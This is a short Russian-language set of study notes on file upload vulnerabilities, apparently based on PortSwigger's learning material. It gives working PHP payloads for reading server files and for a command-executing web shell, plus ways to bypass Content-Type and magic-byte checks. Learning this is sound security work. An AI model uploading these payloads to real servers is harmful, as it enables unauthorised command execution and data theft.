Уязвимости загрузки файлов возникают, когда атакующий может загрузить файл на сервер без достаточной валидации названия, типа, контента и размера файла
## Источники информации
- [File Upload Learning Path PortSwigger Academy](https://portswigger.net/web-security/learning-paths/file-upload-vulnerabilities/)
## Полезные нагрузки
### PHP
- Чтение файла: `<?php echo file_get_contents('/path/to/target/file'); ?>`
- Веб шелл: `<?php echo system($_GET['command']); ?>`
## Загрузка веб шелла
- Если сервер позволяет загружать скрипты (PHP, Java, Python) и выполняет их, атакующий может загрузить на сервер веб шелл: `<?php echo system($_GET['command']); ?>` (запрос для выполнения команд на сервере: `GET /exploit.php?command=id HTTP/1.1)
## Обход ограничений
### Content-Type
- Сервер может сравнивать заголовок Content-Type из HTTP-запроса с ожидаемым MIME-типом (при загрузке изображений обычно это `image/jpeg` и `image/png`). Атакующий может изменить Content-Type в запросе, чтобы обойти ограничение на сервере (например, скрипт PHP с MIME-типом `application/x-httpd-php` изменить на `image/jpeg`)
- Сервер может проверять Magic bytes в начале файла, после них можно вставить полезную нагрузку: `PNG<?php echo system($_GET['command']); ?>`